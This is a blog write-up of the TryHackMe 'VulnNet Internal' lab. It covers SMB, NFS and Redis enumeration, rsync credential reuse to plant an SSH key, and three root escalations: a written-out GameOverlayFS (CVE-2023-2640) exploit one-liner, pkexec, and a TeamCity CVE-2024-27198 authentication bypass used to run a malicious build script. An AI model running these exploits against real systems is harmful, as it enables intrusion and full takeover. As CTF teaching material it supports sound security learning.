---
title: VulnNet Internal - TryHackMe(Easy)
date: 2024-06-22
author: Habukhan
categories: [TryHackMe]
tags: [Hacking, CTFs, THM]
image: https://i.ibb.co/tm8Nvnp/Copie-de-Copie-de-Manager.png
---

* [The Best Academy to Learn Hacking.](https://account.hackthebox.com/register)
* [Beginner Friendly challenges on TryHackMe.](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1)
# TryHackMe(Easy)

VulnNet Entertainment is a company that learns from its mistakes. She quickly realized that she couldn't create a properly secure web application, so she abandoned the idea. Instead, she decided to set up internal services for business purposes. As usual, you are tasked with performing a penetration test of their network and reporting your findings.


# Reconnaissance
To start we run a quick initial nmap scan to see which ports are open.


```bash
└─# rustscan --ulimit 5000 -b 1000 -n -a 10.10.220.246
Host is up, received timestamp-reply ttl 61 (0.65s latency).
Scanned at 2024-05-17 15:42:32 EDT for 1s

PORT    STATE SERVICE     REASON
22/tcp  open  ssh         syn-ack ttl 61
111/tcp open  rpcbind     syn-ack ttl 61
139/tcp open  netbios-ssn syn-ack ttl 61
```
We use enum4linuxto get detailed information.

```bash
└─# enum4linux -a 10.10.220.246
```
![VulnNet Internal](https://i.ibb.co/X8Tmryb/sh.png)

Then we access the sharing of Shares.

```bash
└─# smbclient //10.10.220.246/shares -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Feb  2 04:20:09 2021
  ..                                  D        0  Tue Feb  2 04:28:11 2021
  temp                                D        0  Sat Feb  6 06:45:10 2021
  data                                D        0  Tue Feb  2 04:27:33 2021

                11309648 blocks of size 1024. 3278712 blocks available
smb: \> cd data
smb: \data\> dir
  .                                   D        0  Tue Feb  2 04:27:33 2021
  ..                                  D        0  Tue Feb  2 04:20:09 2021
  data.txt                            N       48  Tue Feb  2 04:21:18 2021
  business-req.txt                    N      190  Tue Feb  2 04:27:33 2021
```
* For the port 111I use the tool showmountto find information about the NFS server
```bash
─# showmount -e 10.10.220.246
Export list for 10.10.220.246:
/opt/conf *
```

Ok so I'm going to mount this NFS share that I just found.
```bash
└─# mount -o nolock 10.10.220.246:/opt/conf mnt 
# ls mnt 
hp  init  opt  profile.d  redis  vim  wildmidi
                                                                                                                                     
┌──(root㉿bloman)-[/home/bloman/CTFs/TryHackMe]
└─# ls mnt/redis
redis.conf
```
We find a configuration redis.confcontaining a password.
```bash
#
# 2) if slave-serve-stale-data is set to 'no' the slave will reply with
#    an error "SYNC with master in progress" to all the kind of commands
#    but to INFO and SLAVEOF.
#
slave-serve-stale-data yes
requirepass "B65Hx562F@ggAZ@F"
```
We check if the service Redisis open with netcat.
```bash
─# nc -nv 10.10.220.246 6379
(UNKNOWN) [10.10.220.246] 6379 (redis) open
```
Now I'm going to use the tool redis-clito connect to it
```bash
─# redis-cli -h 10.10.220.246 --pass 'B65Hx562F@ggAZ@F'
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.10.220.246:6379> INFO
# Server
redis_version:4.0.9
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:9435c3c2879311f3
redis_mode:standalone
os:Linux 4.15.0-135-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:7.4.0
process_id:489
run_id:94d8fdcc6c56026d36bd87180f925f9ca616ba31
tcp_port:6379
uptime_in_seconds:1653
uptime_in_days:0
hz:10
lru_clock:4700236
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
```

We will check the location of Redis data on this Server.
```bash
10.10.220.246:6379> config get dir
1) "dir"
2) "/var/lib/redis"
```

We use the commands Redisto find and read the internal keys. I left the link in the Reference
```bash
10.10.220.246:6379> KEYS *
1) "int"
2) "tmp"
3) "internal flag"
4) "authlist"
5) "marketlist"
(0.65s)
10.10.220.246:6379> 
10.10.220.246:6379> GET "internal flag"
"THM{ff8e518addbbddb74531a724236a8221}"
```
Details of these orders:

* I used the parameter KEYS *to Find all available keys.
* Then GET keynameto read the key

```bash
10.10.220.246:6379> LRANGE marketlist 1 3
1) "Penetration Testing"
2) "Programming"
3) "Data Analysis"
(0.65s)
10.10.220.246:6379> 
10.10.220.246:6379> LRANGE authlist 1 3
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
```
* Here I use LRANGE key start stopto Get a range of elements from a list

we  just got a base64, so I decode it in Terminal
```bash
# echo $base| base64 -d      
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
```
I'm sent to one rsyncand I'm going to use the tool rsyncto log in
```bash
# nc -nv 10.10.220.246 873 
(UNKNOWN) [10.10.220.246] 873 (rsync) open
@RSYNCD: 31.0
```
We use rsyncto access files.
```bash
# rsync --list-only rsync://rsync-connect@10.10.220.246/files
Password: 
drwxr-xr-x          4,096 2021/02/01 07:51:14 .
drwxr-xr-x          4,096 2021/02/06 07:49:29 sys-internal
drwxrwxr-x          4,096 2021/02/06 06:43:14 sys-internal/.ssh
drwx------          4,096 2021/02/02 06:16:16 sys-internal/.thumbnails
drwx------          4,096 2021/02/02 06:16:16 sys-internal/.thumbnails/large
drwx------          4,096 2021/02/02 06:16:18 sys-internal/.thumbnails/normal
-rw-------          8,437 2021/02/02 06:16:17 sys-internal/.thumbnails/normal/2b53c68a980e4c943d2853db2510acf6.png
-rw-------          6,345 2021/02/02 06:16:18 sys-internal/.thumbnails/normal/473aeca0657907b953403884c53d865c.png
-rw-------            978 2021/02/02 06:16:18 sys-internal/.thumbnails/normal/539380d1cb60fcd744fd5094d314fdc1.png
drwx------          4,096 2021/02/01 07:53:21 sys-internal/Desktop
drwxr-xr-x          4,096 2021/02/01 07:53:22 sys-internal/Documents
drwxr-xr-x          4,096 2021/02/01 08:46:46 sys-internal/Downloads
drwxr-xr-x          4,096 2021/02/01 07:53:22 sys-internal/Music
drwxr-xr-x          4,096 2021/02/01 07:53:22 sys-internal/Pictures
drwxr-xr-x          4,096 2021/02/01 07:53:22 sys-internal/Public
drwxr-xr-x          4,096 2021/02/01 07:53:22 sys-internal/Templates
drwxr-xr-x          4,096 2021/02/01 07:53:22 sys-internal/Videos

sent 185 bytes  received 76,450 bytes  5,285.17 bytes/sec
total size is 41,708,382  speedup is 544.25
```
Next, We synchronize our SSH key with the .sshremote directory.

```bash
└─# cat /root/.ssh/id_rsa.pub > authorized_keys 
─# rsync authorized_keys rsync://rsync-connect@10.10.220.246/files/sys-internal/.ssh/
Password: 
```
I check to see if the ssh key has been correctly set up
```bash
─# rsync --list-only rsync://rsync-connect@10.10.220.246/files/sys-internal/.ssh/
Password: 
drwxrwxr-x          4,096 2024/05/17 16:41:05 .
-rw-r--r--             22 2024/05/17 16:41:05 authorized_keys
```
![VulnNet Internal](https://i.ibb.co/ckqX6Zb/success.png)

# Privilege Escalation

To address Privilege Escalation, I will explore three different methods on this Ubuntu machine 4.15.0with the Ubuntu 18.04 LTS (Bionic Beaver) operating system.

## Method 1: Exploiting GameOverlayFs(CVE-2023-2640)

A system is likely to be vulnerable to this vulnerability if the kernel version is lower than 6.2. While our Machine is 4.15.0-135-generictherefore usable.

This vulnerability exclusively affects Linux-based systems. The easiest way to check if your system is vulnerable is to see which version of the Linux kernel it is using by running the command uname -r.

First of all I will check if the version is lower than6.2

```bash
sys-internal@vulnnet-internal:/home$ uname -r
4.15.0-135-generic
```
We have a version 4.15that is therefore vulnerable so I will try to exploit it

* For this, I go to the /tmpand I execute

```bash
sys-internal@vulnnet-internal:~$ cd /tmp
sys-internal@vulnnet-internal:/tmp$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

This allows me to get a shell as root.

```bash
root@vulnnet-internal:/tmp# id
uid=0(root) gid=1000(sys-internal) groups=1000(sys-internal),24(cdrom)
root@vulnnet-internal:/tmp# whoami
root
root@vulnnet-internal:/tmp# ls /root
root.txt
root@vulnnet-internal:/tmp# cat /root/root.txt
THM{e8996faea46df09dba5676dd271c60bd}
```

### Method 2: Exploiting pkexec(SUID)

Looking at In the SUID, there is pkexec.

![VulnNet Internal](https://i.ibb.co/gvKGxh9/pk.png)

* To exploit it I use a Python3 script available on GitHub to exploit it

![VulnNet Internal](https://i.ibb.co/270b07D/explo.png)

## Method 3: Leveraging TeamCity

Finally, I will explore operating a TeamCity server. Using an exploit for the CVE-2024-27198 vulnerability that allows bypassing authentication on TeamCity, I gain super user privileges by executing commands in the TeamCity server.

To start, I check the ports running in the background on the machine using the command ss -tupln. I identify an open port, port 8111.

![VulnNet Internal](https://i.ibb.co/85CSfP9/811.png)

By searching on Google, I confirm that this port is used by a TeamCity server

![VulnNet Internal](https://i.ibb.co/3C4RJY5/teamcity.png)

From there, I configure port forwarding to access the TeamCity server from my local machine using the following SSH command:
```bash
└─# ssh -L 8111:127.0.0.1:8111 sys-internal@10.10.245.63
```
![VulnNet Internal](https://i.ibb.co/Cw5f3Bn/fwd.png)

This creates a local link from port 8111 on my machine to the 8111remote server's port. After establishing this connection, I can access the TeamCity server from my browser using the address 127.0.0.1:8111.

![VulnNet Internal](https://i.ibb.co/ZVhGRRm/Teamcity.png)

We have a login page without having usernames and passwords. So what I would like is to Bypass this page and have the privileges ofSuper User

### NOTE : In February 2024, the Rapid7 research team identified two new vulnerabilities affecting the server JetBrains TeamCity CI/CDincluding CVE-2024-27198 which is an authentication bypass vulnerability in the TeamCity web component which comes from an alternate path problem (CWE-288) and has a base CVSS score of 9.8(Critical).
{: .prompt.infp}

* To bypass this Login page, I will use [this exploit](https://github.com/Chocapikk/CVE-2024-27198) available on Github

![VulnNet Internal](https://i.ibb.co/njFDrRv/exploit.png)

By launching the exploit, a user is created with the following identifiers:

* Username: d9zkck4m
* Password : 5FycViGMlO Then, I log in with these identifiers.

![VulnNet Internal](https://i.ibb.co/DY96QBM/get.png)

# Obtaining an RCE as Root on TeamCity

To achieve RCE (Remote Code Execution) as rooton TeamCity, I relied on an interesting article from TeamCity which explains how to run command line scripts on the platform.

![VulnNet Internal](https://i.ibb.co/hHDrgrW/hacked-Team.png)

In the TeamCity interface, I follow the process indicated in the article. After creating a new project, I move on to setting up the build steps.

![VulnNet Internal](https://i.ibb.co/bBS256f/build.png)

In the build step configuration, I select the option to run a command line script.

![VulnNet Internal](https://i.ibb.co/5n9bvnB/build-step.png)

When asked to provide a script, I insert a malicious script to gain a root shell on the machine.

![VulnNet Internal](https://i.ibb.co/sqgMWz0/shell.png)

After submitting the script and starting the project, I click RUN to start executing the malicious script.

![VulnNet Internal](https://i.ibb.co/L1rkJth/run.png)

Once the script runs successfully, I get a shell locally as root, which gives me full RCE on the machine.

![VulnNet Internal](https://i.ibb.co/w7vk3kM/root.png)

## Additional Resources

Here are some additional resources you might find helpful:

* [GameOverlayFS](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)
* [Redis All Commands](https://www.javatpoint.com/redis-all-commands)
* [Chocapikk Poc for CVE-2024-27198](https://github.com/Chocapikk/CVE-2024-27198)
* [How to Run Command-Line Scripts in TeamCity](https://www.jetbrains.com/teamcity/tutorials/general/running-command-line-scripts/)